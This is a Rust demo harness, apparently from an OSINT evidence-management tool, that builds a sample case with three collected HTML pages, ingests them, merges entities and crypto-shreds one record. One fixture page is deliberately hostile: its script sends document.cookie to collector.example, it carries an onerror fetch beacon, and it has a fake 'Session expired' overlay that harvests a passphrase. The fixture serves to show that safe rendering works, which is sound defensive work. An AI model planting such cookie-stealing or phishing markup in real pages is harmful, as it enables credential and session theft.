//! A case on disk, for looking at.
//!
//! Every panel in this application is reachable only from a case that holds
//! evidence, and nothing in the interface can collect any until the write flows
//! land. So until then the only way to *see* what has been built is to have
//! something build a case and leave it behind.
//!
//! `#[ignore]`d, so it never runs in CI, for the same reason the scale probe is
//! (D-036): the compiler keeps it honest against the code it exercises, while
//! `--ignored` keeps it out of the default suite. It is not a test — it asserts
//! almost nothing — and it says so.
//!
//! ```text
//! cargo test -p kokin-osint --test demo_case -- --ignored --nocapture
//! ```
//!
//! # The hostile page is the point
//!
//! One of the two documents is built the way the pages this product collects are
//! built: inline script, an `onerror` handler on a broken image, a fixed-position
//! overlay, and a form asking for a passphrase. A-031 says the evidence itself is
//! the delivery vehicle, and a screenshot of that page rendered as *text* is the
//! only thing that shows the mitigation working rather than merely asserted.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::path::PathBuf;

const PASSPHRASE: &str = "correct horse battery staple";

/// A page written to attack whoever opens it.
///
/// Nothing here is exotic. Every one of these is ordinary on a page collected
/// from a forum, a marketplace or a paste site, which is exactly why the
/// rendering path has to assume it.
const HOSTILE: &[u8] = br#"<html>
<head><title>Tungsten Holdings - contact</title></head>
<body>
<h1>Tungsten Holdings</h1>
<p>Press enquiries: <a href="mailto:press@tungsten.example">press@tungsten.example</a></p>
<p>Registration QX-7741, filed 2019.</p>
<script>window.location = 'http://collector.example/?c=' + document.cookie;</script>
<img src="x" onerror="fetch('http://collector.example/beacon')">
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#14161a;z-index:9999">
  <h2>Session expired</h2>
  <form action="http://collector.example/harvest">
    <label>Case passphrase <input type="password" name="p"></label>
    <button>Unlock</button>
  </form>
</div>
</body>
</html>
"#;

const ORDINARY: &[u8] = br#"<html>
<head><title>Mercer Logistics - about</title></head>
<body>
<p>Founded 2014 by A. Mercer. Contact a.mercer@mercerlog.example.</p>
</body>
</html>
"#;

/// A document collected and then deliberately destroyed.
///
/// Present so the artifact list has one of each state worth looking at. The
/// point of rendering it is that it must not look like a fault: the case is
/// working exactly as designed and somebody made a decision (A-032).
const SHREDDED: &[u8] = br#"<html>
<head><title>Redacted filing</title></head>
<body><p>Withdrawn at the source's request.</p></body>
</html>
"#;

#[test]
#[ignore = "builds a case on disk to look at; not a test"]
fn build_a_case_to_look_at() {
    let root = std::env::var("KOKIN_DEMO_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| std::env::temp_dir().join("kokin-demo"));
    let _ = std::fs::remove_dir_all(&root);
    std::fs::create_dir_all(&root).unwrap();

    let hostile_file = root.join("tungsten-contact.html");
    let ordinary_file = root.join("mercer-about.html");
    let shredded_file = root.join("redacted-filing.html");
    std::fs::write(&hostile_file, HOSTILE).unwrap();
    std::fs::write(&ordinary_file, ORDINARY).unwrap();
    std::fs::write(&shredded_file, SHREDDED).unwrap();

    let case = root.join("demo.kokincase");
    let session = kokin_osint_lib::Session::default();
    let created = session.create(&case, "demo", PASSPHRASE).unwrap();

    session
        .with_case(|open| {
            let blobs = kokin_blob::BlobStore::new(open.paths.blobs());
            let mut ingest = |path: &std::path::Path, job: &str| {
                kokin_ingest::ingest_file(
                    &mut open.conn,
                    &blobs,
                    &open.cmk,
                    path,
                    &kokin_ingest::IngestContext {
                        connector: "file_import",
                        job_id: job,
                    },
                )
                .unwrap()
                .artifact_id
            };

            let hostile = ingest(&hostile_file, "job-tungsten");
            // The ordinary page is deliberately left unread, so the artifact
            // list has something in the state that matters — a document nothing
            // has looked at is invisible to search and looks identical to one
            // that holds nothing.
            ingest(&ordinary_file, "job-mercer");

            let shredded = ingest(&shredded_file, "job-redacted");

            kokin_extract::extract_artifact(
                &mut open.conn,
                &blobs,
                &open.cmk,
                &hostile,
                kokin_extract::Limits::default(),
            )
            .unwrap();
            kokin_extract::extract_artifact(
                &mut open.conn,
                &blobs,
                &open.cmk,
                &shredded,
                kokin_extract::Limits::default(),
            )
            .unwrap();

            // Two people who turn out to be one, judged differently before
            // anyone decided that, so the confidence block has a disagreement
            // to show and the merge has something to be a projection over.
            let observations: Vec<String> = {
                let mut stmt = open
                    .conn
                    .prepare("SELECT id FROM observation WHERE artifact_id = ?1 ORDER BY rowid")
                    .unwrap();
                let rows = stmt
                    .query_map([&hostile], |r| r.get::<_, String>(0))
                    .unwrap();
                rows.map(|r| r.unwrap()).collect()
            };
            let evidence: Vec<kokin_graph::Grounding> = observations
                .iter()
                .map(|id| kokin_graph::Grounding::supporting_observation(id))
                .collect();

            let first = kokin_graph::create_entity(
                &mut open.conn,
                kokin_graph::NewEntity {
                    type_key: "person",
                    display_name: "Tungsten Holdings press office",
                    notes: "named on the contact page",
                },
                &evidence[..1],
            )
            .unwrap();
            let second = kokin_graph::create_entity(
                &mut open.conn,
                kokin_graph::NewEntity {
                    type_key: "person",
                    display_name: "press@tungsten.example",
                    notes: "the address itself, before anyone connected it",
                },
                &evidence[..1],
            )
            .unwrap();

            kokin_graph::add_identifier(
                &mut open.conn,
                &first,
                "email_address",
                "press@tungsten.example",
                &evidence[..1],
            )
            .unwrap();

            for (entity, value, why) in [
                (
                    &first,
                    "usually_reliable",
                    "the registration number checks out",
                ),
                (
                    &second,
                    "mixed",
                    "the page also carries a credential harvester",
                ),
            ] {
                kokin_graph::assess(
                    &mut open.conn,
                    kokin_graph::Subject {
                        kind: kokin_graph::SubjectKind::Entity,
                        id: entity,
                    },
                    "source_reliability",
                    value,
                    &format!("[{:?}]", why),
                    "user:local",
                )
                .unwrap();
            }
            // One dimension a rule judged, so an automated actor is on screen
            // beside the human ones. It has to be a machine-assignable value:
            // kokin_graph refuses a rule the right to record
            // insufficient_information, because "we could not establish this"
            // is a conclusion a person reaches, not one a matcher reports.
            kokin_graph::assess(
                &mut open.conn,
                kokin_graph::Subject {
                    kind: kokin_graph::SubjectKind::Entity,
                    id: &first,
                },
                "identifier_match",
                "similar_unverified",
                "[\"one address, seen once, no corroboration\"]",
                "rule:shared_identifier",
            )
            .unwrap();

            kokin_graph::resolution::merge(
                &mut open.conn,
                &first,
                &second,
                "user:local",
                "the address on the contact page is the press office's own",
                None,
            )
            .unwrap();

            // Destroy the key, keep the record. The observations survive their
            // source, which is the whole reason crypto-shredding is not deletion.
            open.conn
                .execute(
                    "UPDATE blob SET wrapped_key = NULL, wrapped_nonce = NULL,
                            shredded_utc = '2026-08-14T09:00:00Z'
                      WHERE content_hash = (SELECT content_hash FROM artifact WHERE id = ?1)",
                    [&shredded],
                )
                .unwrap();
            Ok(())
        })
        .unwrap();
    session.close().unwrap();

    println!("case:        {}", case.display());
    println!("passphrase:  {PASSPHRASE}");
    println!("recovery:    {}", created.recovery_key);
}
